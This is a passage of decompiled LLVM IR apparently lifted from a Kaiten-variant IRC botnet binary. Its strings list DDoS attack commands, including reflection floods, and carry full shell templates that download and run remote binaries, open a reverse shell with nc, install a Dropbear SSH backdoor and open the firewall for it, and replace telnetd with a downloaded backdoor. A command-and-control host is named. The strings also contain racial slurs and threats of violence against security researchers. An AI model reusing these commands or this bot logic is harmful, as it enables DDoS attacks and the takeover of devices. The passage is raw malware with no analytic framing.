i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8067cfe.461, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8067d03.462, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8067d08.463, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8067d0d.464, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8067d12.465, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8067d17.466, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8067d1c.467, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8067d21.468, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8067d26.469, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8067d2c.470, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8067d32.471, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8067d38.472, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8067d3e.473, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8067d44.474, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8067d4a.475, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8067d50.476, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8067d56.477, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8067d5c.478, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8067d62.479, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067d68.480, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8067d6b.481, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8067d76.262, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067d7e.482, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067d81.483, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067d84.484, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067d87.485, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067d8a.486, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067d8d.487, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067d90.488, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067d93.489, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8067d96.490, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067d99.491, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067d9d.492, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067da1.493, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067da5.494, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067da9.495, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067dad.496, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067db1.497, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067db5.498, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067db9.499, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8067dbd.500, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8067dc1.501, i32 0, i32 0)]
@global_var_806a54f.503 = constant [22 x i8] c"Scanning for bot %s.\0A\00"
@global_var_806a565.504 = constant [24 x i8] c"Killing bot %s PID %d.\0A\00"
@global_var_8074060.505 = local_unnamed_addr global i32 0
@global_var_806a580.506 = constant [32 x i8] c"Bot %s found at %s Deleting...\0A\00"
@global_var_806a5a0.507 = constant [31 x i8] c"Bot %s niggered successfully.\0A\00"
@global_var_8074064.508 = local_unnamed_addr global i32 0
@global_var_806a5bf.509 = constant [26 x i8] c"Unable to nigger bot %s.\0A\00"
@global_var_806a5dc.510 = constant [73 x i8] c"Bot %s was not found on the system. It must have been running in memory.\00"
@global_var_806a628.511 = constant [56 x i8] c"Botkill finished. %d bots killed and %d bots niggered.\0A\00"
@global_var_806a660.512 = constant [49 x i8] c"NOTICE %s :%d bots killed and %d bots niggered.\0A\00"
@global_var_806a691.513 = constant [30 x i8] c"NOTICE %s :%s resolves to %s\0A\00"
@global_var_806a6af.514 = constant [28 x i8] c"NOTICE %s :DNS2IP <domain>\0A\00"
@global_var_806a6cb.515 = constant [30 x i8] c"NOTICE %s :GETIP <interface>\0A\00"
@global_var_806a6e9.516 = constant [4 x i8] c"148\00"
@global_var_806a6ed.517 = constant [24 x i8] c"NOTICE %s :My IP is %s\0A\00"
@global_var_806a708.518 = constant [40 x i8] c"NOTICE %s :UPDATEHTTP <host> <src:bin>\0A\00"
@global_var_806a730.519 = constant [96 x i8] c"NOTICE %s :Unable to create socket (Wierd, you shouldnt get this error and ITS NOT MY FAULT!).\0A\00"
@global_var_806a790.520 = constant [11 x i8] c"gcc --help\00"
@global_var_806a79b.521 = constant [6 x i8] c"Usage\00"
@global_var_806a7a1.522 = constant [30 x i8] c"NOTICE %s :Receiving update.\0A\00"
@global_var_806a7bf.523 = constant [11 x i8] c"mkdir /tmp\00"
@global_var_806a7ca.524 = constant [8 x i8] c"/tmp/.c\00"
@global_var_807cb80.525 = global i32 0
@global_var_806a7d4.526 = constant [71 x i8] c"(gcc -o %s /tmp/.c; rm -rf /tmp/.c; kill -9 %d; %s &) > /dev/null 2>&1\00"
@global_var_806a81b.527 = constant [8 x i8] c"/tmp/.o\00"
@global_var_806a824.528 = constant [188 x i8] c"export PATH=/usr/sbin:/bin:/usr/bin:/sbin:/var/bin;chmod +x /tmp/.o; trap '' 1;sh -c '/var/bin/killall knight*;/var/bin/killall kt*;/var/bin/killall .o;/var/bin/sleep 5;trap  1;/tmp/.o '&\00"
@global_var_806a8e0.529 = constant [26 x i8] c"NOTICE %s :MOVE <server>\0A\00"
@global_var_807cc84.530 = local_unnamed_addr global i32 0
@global_var_807406c.531 = local_unnamed_addr global i32 0
@global_var_806a8fa.532 = constant [9 x i8] c"/var/bin\00"
@global_var_806a904.533 = constant [40 x i8] c"NOTICE %s :HACKPGK <url> <binary name>\0A\00"
@global_var_806a92c.534 = constant [277 x i8] c"GET /%s HTTP/1.1\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: HackZilla/1.67 [en] (X11; U; Linux 2.2.16-3 x64)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_806aa44.535 = constant [39 x i8] c"NOTICE %s :Installed %s to hack path.\0A\00"
@global_var_806aa6b.536 = constant [21 x i8] c"cat %s > /var/bin/%s\00"
@global_var_806aa80.537 = constant [6 x i8] c"rm %s\00"
@global_var_806aa86.538 = constant [22 x i8] c"chmod 775 /var/bin/%s\00"
@global_var_806aa9c.539 = constant [18 x i8] c"ls -l /var/bin/%s\00"
@global_var_806aab0.540 = constant [55 x i8] c"NOTICE %s :Non-root/non-spoof DDoS commands commands:\0A\00"
@global_var_806aae8.541 = constant [65 x i8] c"NOTICE %s :STD <ip> <port> <time> = A non spoof HIV STD flooder\0A\00"
@global_var_806ab2c.542 = constant [70 x i8] c"NOTICE %s :HOLD <host> <port> <time> = A vanilla TCP connect flooder\0A\00"
@global_var_806ab74.543 = constant [71 x i8] c"NOTICE %s :JUNK <host> <port> <time> = A vanilla TCP flooder (modded)\0A\00"
@global_var_806abbc.544 = constant [141 x i8] c"NOTICE %s :UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs> = An advanced non spoof UDP flooder modified by Milenko\0A\00"
@global_var_806ac4c.545 = constant [56 x i8] c"NOTICE %s :WGETFLOOD <url> <secs> = An HTTP(S) flooder\0A\00"
@global_var_806ac84.546 = constant [33 x i8] c"NOTICE %s :Spoof/root commands:\0A\00"
@global_var_806aca8.547 = constant [55 x i8] c"NOTICE %s :UDP <target> <port> <secs> = A UDP flooder\0A\00"
@global_var_806ace0.548 = constant [101 x i8] c"NOTICE %s :PAN <target> <port> <secs> = An advanced syn flooder that will kill most network drivers\0A\00"
@global_var_806ad48.549 = constant [162 x i8] c"NOTICE %s :TCP <target> <port> <time> <flags> <packetsize> <pollinterval> <threads> = An advanced TCP flooder with multithreading. Will kill almost any service.\0A\00"
@global_var_806adec.550 = constant [137 x i8] c"NOTICE %s :PHATWONK <target> <flags/method> <secs> = A leet flooder coded by Milenko, attacks 31 ports. Can set flags or attack method.\0A\00"
@global_var_806ae78.551 = constant [120 x i8] c"NOTICE %s :BLACKNURSE <target ip> <secs> = An ICMP packet flooder that will crash most firewalls and use loads of CPU.\0A\00"
@global_var_806aef0.552 = constant [81 x i8] c"NOTICE %s :SOCKSTRESS <ip>:<port> <interface> -s <time> [-p payload] [-d delay]\0A\00"
@global_var_806af44.553 = constant [168 x i8] c"NOTICE %s :TARGA3 <ip1> [ip2] ... [-s seconds] = Targa3 attack. TCP stack fuzzer. Can attack up to 200 hosts at once. Will bypass most filters and crash old machines.\0A\00"
@global_var_806afec.554 = constant [148 x i8] c"NOTICE %s :NTP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> = A NTP DrDoS flooder. Very potent.\0A\00"
@global_var_806b080.555 = constant [110 x i8] c"NOTICE %s :DNS <IP> <port> <reflection file url> <threads> <time> = A DNS DrDoS flooder. Almost unblockable.\0A\00"
@global_var_806b0f0.556 = constant [208 x i8] c"NOTICE %s :QUAKE3 <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> = A DrDoS flooder that uses the Quake3 protocol. Nearly as powerful as NTP, harder to block.\0A\00"
@global_var_806b1c0.557 = constant [155 x i8] c"NOTICE %s :SNMP <IP> <port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> =   SNMP DrDoS flooder. Insane amp factor (600 - 1700x)\0A\00"
@global_var_806b25b.558 = constant [27 x i8] c"NOTICE %s :Misc commands:\0A\00"
@global_var_806b278.559 = constant [63 x i8] c"NOTICE %s :GETIP <interface> = Gets IP address from interface\0A\00"
@global_var_806b2b8.560 = constant [50 x i8] c"NOTICE %s :RNDNICK = Randomizes the knights nick\0A\00"
@global_var_806b2ec.561 = constant [57 x i8] c"NOTICE %s :NICK <nick> = Changes the nick of the client\0A\00"
@global_var_806b328.562 = constant [46 x i8] c"NOTICE %s :SERVER <server> = Changes servers\0A\00"
@global_var_806b358.563 = constant [50 x i8] c"NOTICE %s :GETSPOOFS = Gets the current spoofing\0A\00"
@global_var_806b38c.564 = constant [59 x i8] c"NOTICE %s :SPOOFS <subnet> = Changes spoofing to a subnet\0A\00"
@global_var_806b3c8.565 = constant [62 x i8] c"NOTICE %s :DISABLE = Disables all packeting from this client\0A\00"
@global_var_806b408.566 = constant [60 x i8] c"NOTICE %s :ENABLE = Enables all packeting from this client\0A\00"
@global_var_806b444.567 = constant [77 x i8] c"NOTICE %s :BOTKILL = Runs the botkiller again (runs once knight is started)\0A\00"
@global_var_806b494.568 = constant [36 x i8] c"NOTICE %s :KILL = Kills the knight\0A\00"
@global_var_806b4b8.569 = constant [97 x i8] c"NOTICE %s :GET <http address> <save as> = Downloads a file off the web and saves it onto the hd\0A\00"
@global_var_806b51c.570 = constant [62 x i8] c"NOTICE %s :UPDATE <http address> <src:bin> = Update this bot\0A\00"
@global_var_806b55c.571 = constant [104 x i8] c"NOTICE %s :HACKPKG <http address> <bin name> = HackPkg is here! Install a bin, using http, no depends!\0A\00"
@global_var_806b5c4.572 = constant [49 x i8] c"NOTICE %s :VERSION = Requests version of client\0A\00"
@global_var_806b5f8.573 = constant [50 x i8] c"NOTICE %s :KILLALL = Kills all current packeting\0A\00"
@global_var_806b62c.574 = constant [33 x i8] c"NOTICE %s :HELP = Displays this\0A\00"
@global_var_806b650.575 = constant [61 x i8] c"NOTICE %s :IRC <command> = Sends this command to the server\0A\00"
@global_var_806b690.576 = constant [46 x i8] c"NOTICE %s :SH <command> = Executes a command\0A\00"
@global_var_806b6c0.577 = constant [62 x i8] c"NOTICE %s :ISH <command> = SH, interactive, sends to channel\0A\00"
@global_var_806b700.578 = constant [65 x i8] c"NOTICE %s :SHD <command> = Executes a psuedo-daemonized command\0A\00"
@global_var_806b744.579 = constant [55 x i8] c"NOTICE %s :GETBB <tftp server> = Get a proper busybox\0A\00"
@global_var_806b77c.580 = constant [88 x i8] c"NOTICE %s :INSTALL  <http server/file_name> = Download & install a binary to /var/bin \0A\00"
@global_var_806b7d4.581 = constant [55 x i8] c"NOTICE %s :BASH <cmd> = Execute commands using bash. \0A\00"
@global_var_806b80c.582 = constant [84 x i8] c"NOTICE %s :BINUPDATE <http:server/package> = Update a binary in /var/bin via wget \0A\00"
@global_var_806b860.583 = constant [89 x i8] c"NOTICE %s :SCAN <nmap options> = Call the nmap wrapper script and scan with your opts. \0A\00"
@global_var_806b8bc.584 = constant [76 x i8] c"NOTICE %s :RSHELL <server> <port> = Equates to nohup nc ip port -e /bin/sh\0A\00"
@global_var_806b908.585 = constant [98 x i8] c"NOTICE %s :LOCKUP <http:server> = Kill telnet, d/l aes backdoor from <server>, run that instead.\0A\00"
@global_var_806b96c.586 = constant [107 x i8] c"NOTICE %s :GETSSH <http:server/dropbearmulti> = D/l, install, configure and start dropbear on port 30022.\0A\00"
@global_var_806b9d7.587 = constant [28 x i8] c"NOTICE %s :Killing pid %d.\0A\00"
@global_var_806b9f3.589 = constant [21 x i8] c"kill -9 %d;kill -9 0\00"
@global_var_806ba08.590 = constant [5 x i8] c"%s%s\00"
@global_var_806ba0d.591 = constant i32 1414725665
@global_var_806f06c.592 = local_unnamed_addr global i32 1
@global_var_80676f0.593 = constant [3 x i8] c"AS\00"
@global_var_806f070.594 = global [3 x i8]* @global_var_80676f0.593
@global_var_806baf8.595 = constant [5 x i8] c"IRC \00"
@global_var_806bafd.596 = constant [4 x i8] c"%s\0A\00"
@global_var_806bb01.597 = constant [4 x i8] c"SH \00"
@global_var_806bb08.598 = constant [69 x i8] c"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s\00"
@global_var_806bb4d.599 = constant [15 x i8] c"NOTICE %s :%s\0A\00"
@global_var_806bb5c.600 = constant [5 x i8] c"SHD \00"
@global_var_806bb64.601 = constant [100 x i8] c"export HOME=/tmp;export;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;trap '' 1 2; sh -c '%s'&\00"
@global_var_806bbc8.602 = constant [7 x i8] c"GETBB \00"
@global_var_806bbd0.603 = constant [330 x i8] c"export fileGet=busybox-mips;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;cd /var;(([ ! -e /var/\22$fileGet\22 ] || [ ! -s /var/\22$fileGet\22 ]) && tftp -g -r \22$fileGet\22 %s && chmod +x \22$fileGet\22 && ./\22$fileGet\22 mkdir bin && ./\22$fileGet\22 --install -s /var/bin && ls -l \22$fileGet\22 || echo It appears we already have /var/\22$fileGet\22)\00"
@global_var_806bd1a.604 = constant [8 x i8] c"GETSSH \00"
@global_var_806bd24.605 = constant [668 x i8] c"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;cd /tmp;export url=%s;name=`echo \22$url\22 | sed 's#.*/##'` && wget -O \22$name\22 \22$url\22;chmod +x \22$name\22;mv \22$name\22 /var/bin;ls -l /var/bin/\22$name\22 && dss=/var/dbs/dropbear_dss_host_key;rsa=/var/dbs/dropbear_rsa_host_key;ecd=/var/dbs/dropbear_ecdsa_host_key;cd /var/bin;for i in dropbear dbclient dropbearkey dropbearconvert;do ln -s /var/bin/dropbearmulti $i;done;[ ! -d /var/dbs ] && mkdir /var/dbs;[ -f $dss ] || dropbearkey -t dss -f $dss;[ -f $rsa ] || dropbearkey -t rsa -f $rsa;[ -f $ecd ] || dropbearkey -t ecdsa -f $ecd;dropbear -r $dss -r $rsa -r $ecd -p 30022;iptables -I INPUT 1 -p tcp --dport 30022 -j ACCEPT\00"
@global_var_806bfc0.606 = constant [9 x i8] c"INSTALL \00"
@global_var_806bfcc.607 = constant [389 x i8] c"export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo \22$url\22 | sed 's#.*/##'`;(([ ! -e /var/bin/$name ] || [ ! -s /var/bin/$name ]) && echo \22$name either doesnt exist or eq 0 so we get\22 && cd /tmp && wget -O \22$name\22 \22$url\22 && chmod +x \22$name\22 && mv \22$name\22 /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo \22It appears I already have $name\22)\00"
@global_var_806c151.608 = constant [11 x i8] c"BINUPDATE \00"
@global_var_806c15c.609 = constant [371 x i8] c"export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo \22$url\22 | sed 's#.*/##'`;([ -e /var/bin/$name ]) && echo $name exists so we delete it... && rm /var/bin/$name && cd /tmp && wget -O $name $url && chmod +x $name && mv $name /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo \22$name doesnt exist, perhaps you mean INSTALL?\22\00"
@global_var_806c2cf.610 = constant [8 x i8] c"LOCKUP \00"
@global_var_806c2d8.611 = constant [235 x i8] c"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;export HOME=/tmp;[ ! -f /var/bin/dmips ] && cd /var/bin;wget -O dmips %s;chmod +x /var/bin/dmips;(killall -9 telnetd || kill -9 telnetd) && (nohup dmips || trap '' 1 2 /var/bin/dmips)\00"
@global_var_806c3c3.612 = constant [8 x i8] c"RSHELL \00"
@global_var_806c3cc.613 = constant [114 x i8] c"export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;trap '' 1 2; sh -c 'nohup nc %s -e /bin/sh '&\00"
@global_var_806c43e.614 = constant [6 x i8] c"SCAN \00"
@global_var_806c444.615 = constant [405 x i8] c"export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;(([ ! -x /var/bin/scan ] || [ ! -x /var/bin/nmap ]) && echo \22I am missing either scan or nmap, and Shellzrus was on Xanax when he wrote this, so you need to do INSTALL http:/server/nmap and INSTALL http://server/scan first...\22 && ([ -f /var/bin/nmap ] && ls -l /var/bin/nmap) && ([ -f /var/bin/scan ] && ls -l /var/bin/scan) || scan %s)\00"
@global_var_806c5d9.616 = constant [6 x i8] c"BASH \00"
@global_var_806c5e0.617 = constant [98 x i8] c"export HOME=/tmp;export SHELL=/var/bin/bash;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;%s\00"
@global_var_8068a6a.618 = constant i32 1684078592
@global_var_806ba0f.619 = constant [4 x i8] c"STD\00"
@global_var_806f740.620 = local_unnamed_addr global [4 x i8]* @global_var_806ba0f.619
@global_var_806f744.621 = local_unnamed_addr global i32 134533799
@global_var_806c642.622 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_807e0dc.623 = local_unnamed_addr global i32 0
@global_var_806c64f.624 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_806c65c.625 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_806c664.626 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_806c670.627 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_80676e0.632 = constant [16 x i8] c"wb.realunix.org\00"
@global_var_806f064.633 = global [16 x i8]* @global_var_80676e0.632
@global_var_806c6ec.634 = constant [73 x i8] c"SUPER MOTHERFUCKING KAITEN WORMY BY MILENKO. PRAISE KEK. NULLZSEC ROX!!!\00"
@global_var_806c738.635 = constant [68 x i8] c"Capsaicin kaiten variant coded (and wormified) by Milenko aka Freak\00"
@global_var_806c77c.636 = constant [130 x i8] c"17 DDoS methods nigga! And for the netsec teams and feds reading this we will null all of your honeypots and slit your throats!!!\00"
@global_var_807ca64.637 = local_unnamed_addr global i32 0
@global_var_807ca68.638 = local_unnamed_addr global i32 0
@global_var_807ca6c.639 = local_unnamed_addr global i32 0
@global_var_807ca70.640 = local_unnamed_addr global i32 0
@global_var_806c7fe.641 = constant [3 x i8] c"sh\00"
@global_var_807cb7c.642 = local_unnamed_addr global i32 0
@global_var_806c801.643 = constant [8 x i8] c"KPinetK\00"
@global_var_806c80c.644 = constant [48 x i8] c"NICK [%s|%s]%s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_806c83c.645 = constant i32 1380253706
@global_var_806c6cd.646 = constant [4 x i8] c"352\00"
@global_var_806f860.647 = global [4 x i8]* @global_var_806c6cd.646
@global_var_806f864.648 = global i32 134564678
@global_var_806c83e.649 = constant [6 x i8] c"ERROR\00"
@global_var_80738c0 = external global i32
@global_var_807a620.650 = local_unnamed_addr global i32 0
@global_var_807a624.651 = local_unnamed_addr global i32 0
@global_var_8073aa0.652 = global i32 0
@global_var_807a628.653 = local_unnamed_addr global i32 0
@global_var_807e100.654 = local_unnamed_addr global i32 0
@global_var_807e104.655 = local_unnamed_addr global i32 0
@global_var_807e10c.656 = local_unnamed_addr global i32 0
@global_var_8073c80.657 = local_unnamed_addr global i32* @global_var_80738c0
@global_var_8073c84.658 = local_unnamed_addr global i32 -1
@global_var_806f8a0.659 = global i32 0
@global_var_8073ab8.660 = local_unnamed_addr global i32 0
@global_var_8073ab4.661 = local_unnamed_addr global i32 0
@global_var_80784a0.662 = local_unnamed_addr global i32 0
@global_var_80784a4.663 = local_unnamed_addr global i32 0
@global_var_807e110.664 = local_unnamed_addr global i32 0
@global_var_8073c90.665 = local_unnamed_addr global i32 34
@global_var_80738a0.666 = local_unnamed_addr global i32 2
@global_var_8073ae8.667 = global i32 0
@global_var_8073ae4.668 = local_unnamed_addr global i32* @global_var_8073ae8.667
@global_var_8073aec.669 = local_unnamed_addr global i32 0
@global_var_8073af0.670 = global i32 0
@global_var_8073c8c.671 = local_unnamed_addr global i32 33
@global_var_8073c98.672 = local_unnamed_addr global i32 134578237
@global_var_807c8d0.673 = local_unnamed_addr global i32 0
@global_var_80784a8.674 = local_unnamed_addr global i32 0
@global_var_807a62c.675 = local_unnamed_addr global i32 0
@global_var_807a630.676 = local_unnamed_addr global i32 0
@global_var_806f8b0.677 = global i32 0
@global_var_8073abc.678 = local_unnamed_addr global i32* @global_var_806f8b0.677
@global_var_80784ac.679 = global i32 0
@global_var_80784c4.680 = global i32 0
@global_var_80784c8.681 = global i32 0
@global_var_80784cc.682 = global i32 0
@global_var_8073eb0.683 = global i32 0
@global_var_8056d6c.684 = constant i32 -2062498685
@global_var_80784e0.685 = global i32 0
@global_var_8056dc4.686 = constant i32 -2057255805
@global_var_8073c88.687 = local_unnamed_addr global i32 32
@global_var_8056cf4.688 = constant i32 -1193113149
@global_var_8078600.689 = global i32 0
@global_var_8078604.690 = global i32 0
@global_var_807a600.691 = global i32 0
@global_var_807a61c.692 = global i32 0
@global_var_807a618.693 = local_unnamed_addr global i32 0
@global_var_8073d58.694 = local_unnamed_addr global i32 35
@global_var_8073d5c.695 = local_unnamed_addr global i32 64
@global_var_807a638.696 = local_unnamed_addr global i32 0
@global_var_806f8c0.697 = global i32 0
@global_var_807e118.698 = local_unnamed_addr global i32 0
@global_var_807a664.699 = global i32 0
@global_var_807a668.700 = global i32 0
@global_var_80738d4.701 = local_unnamed_addr global i32 0
@global_var_8073d7c.702 = global i32* @global_var_8073dc0.80
@global_var_8073904.703 = local_unnamed_addr global i32* @global_var_807a664.699
@global_var_807390c.704 = local_unnamed_addr global i32* @global_var_807a668.700
@global_var_8073db0.705 = local_unnamed_addr global i32 2
@global_var_807a634.706 = local_unnamed_addr global i32 0
@global_var_807e114.707 = local_unnamed_addr global i32 0
@global_var_8073a5c.708 = local_unnamed_addr global i32 0
@global_var_8073c4c.710 = local_unnamed_addr global i32 0
@global_var_8073c48.711 = local_unnamed_addr global i32 0
@global_var_8073ab0.712 = local_unnamed_addr global i32 0
@global_var_807a63c.713 = global i32 0
@global_var_807a654.714 = global i32 0
@global_var_807a660.715 = local_unnamed_addr global i32 0
@global_var_80597c6.716 = constant [4 x i8] c"XZj\00"
@global_var_8073d98.718 = global i32 0
@global_var_807a688.719 = local_unnamed_addr global i32 0
@global_var_807a68c.720 = local_unnamed_addr global i32 0
@global_var_806e857.721 = constant [3 x i8] c": \00"
@global_var_806e859.722 = constant i32 539828224
@global_var_806cba0.723 = constant [8 x i8] c"%s%s%m\0A\00"
@global_var_807a66c.724 = global i32 0
@global_var_807a684.725 = local_unnamed_addr global i32 0
@global_var_806cba8.726 = constant [3 x i8] c"-c\00"
@global_var_806cbb0.727 = constant [3 x i8] c"sh\00"
@global_var_806cbab.728 = constant [8 x i8] c"/bin/sh\00"
@global_var_8073d80.729 = global i32 0
@global_var_806cbb4.730 = constant i32 0
@global_var_806cbcc.731 = constant [6 x i8] c"(nil)\00"
@global_var_806cbd2.732 = constant [7 x i8] c"(null)\00"
@global_var_806cbd9.733 = constant i32 2949163
@global_var_806cc46.735 = constant i32 327688
@global_var_8073fcc = external local_unnamed_addr global i32
@global_var_806e2e0.737 = constant i32 65536
@global_var_806cc3e.738 = constant [8 x i8] c" +0-#'I\00"
@global_var_806cbec.739 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_806cc29.740 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_806cc1f.741 = constant i32 117506048
@global_var_806cc10.742 = constant i32 331776
@global_var_806cc80.743 = constant [8 x i8] c"Success\00"
@global_var_806cc6a.744 = constant [15 x i8] c"Unknown error \00"
@global_var_8073fd4.745 = local_unnamed_addr global i32* @global_var_806e2e0.737
@global_var_807c6a0.746 = global i32 0
@global_var_806d9c0.747 = constant i32 -9
@global_var_806d7e8.748 = constant [42 x i8] c"Address family for hostname not supported\00"
@global_var_806d9c4.749 = constant [42 x i8]* @global_var_806d7e8.748
@global_var_806d7da.750 = constant [14 x i8] c"Unknown error\00"
@global_var_806da60.752 = constant i32 0
@global_var_806dab8.753 = constant i32 0
@global_var_806da40.754 = constant i32 10
@global_var_806da97.755 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_806da94.757 = constant [3 x i8] c"%x\00"
@global_var_807c6a4.758 = global i32 0
@global_var_807c6c0.759 = global i32 0
@global_var_807c88c.760 = global i32 0
@global_var_807400c.761 = global i32 0
@global_var_807e560.762 = local_unnamed_addr global i32 0
@global_var_807e554.763 = global i32 0
@global_var_806dac8.764 = constant [25 x i8] c"%u.%u.%u.%u.in-addr.arpa\00"
@global_var_806dae1.765 = constant [7 x i8] c"%x.%x.\00"
@global_var_806dae8.766 = constant [9 x i8] c"ip6.arpa\00"
@global_var_807e14c.768 = global i32 0
@global_var_807e150.769 = local_unnamed_addr global i32 0
@global_var_807e154.770 = global i32 0
@global_var_807e160.771 = local_unnamed_addr global i32 0
@global_var_807e454.772 = global i32 0
@global_var_807e47c.773 = local_unnamed_addr global i32 0
@global_var_807e46c.774 = local_unnamed_addr global i32 0
@global_var_807e470.775 = local_unnamed_addr global i32 0
@global_var_807e474.776 = local_unnamed_addr global i32 0
@global_var_807e478.777 = local_unnamed_addr global i32 0
@global_var_807e484.778 = local_unnamed_addr global i32 0
@global_var_807e490.779 = local_unnamed_addr global i32 0
@global_var_807e488.780 = local_unnamed_addr global i32 0
@global_var_807e494.781 = local_unnamed_addr global i32 0
@global_var_807e468.782 = local_unnamed_addr global i32 0
@global_var_807e464.784 = local_unnamed_addr global i32 0
@global_var_807e48c.785 = local_unnamed_addr global i32 0
@global_var_807e15c.786 = local_unnamed_addr global i32 0
@global_var_8073ec8.787 = global i32 0
@global_var_8073ee0.789 = global i32 0
@global_var_8073ef8 = external global i32
@global_var_8073f24.791 = global i32 -1726662223
@global_var_8073f00.792 = local_unnamed_addr global i32* @global_var_8073f24.791
@global_var_8073efc.793 = global i32* @global_var_8073f24.791
@global_var_806db14.794 = constant i32 0
@global_var_806db00.795 = constant i32 0
@global_var_8073fa0.796 = global i32 0
@global_var_807c8a4.797 = local_unnamed_addr global i32 0
@global_var_807c8cc.798 = local_unnamed_addr global i32 0
@global_var_8073fbc.799 = local_unnamed_addr global i32 1
@global_var_807c8ac.800 = local_unnamed_addr global i32 0
@global_var_807c8a8.801 = global i32 0
@global_var_807c8b0.802 = local_unnamed_addr global i32 0
@global_var_807c8c0.804 = local_unnamed_addr global i32 0
@global_var_807c8bc.805 = local_unnamed_addr global i32 0
@global_var_806db28.806 = constant [16 x i8] c"POSIXLY_CORRECT\00"
@global_var_806db38.810 = constant [3 x i8] c"--\00"
@global_var_806db3b.811 = constant [30 x i8] c"%s: option `%s' is ambiguous\0A\00"
@global_var_806db59.812 = constant [45 x i8] c"%s: option `--%s' doesn't allow an argument\0A\00"
@global_var_806db86.813 = constant [45 x i8] c"%s: option `%c%s' doesn't allow an argument\0A\00"
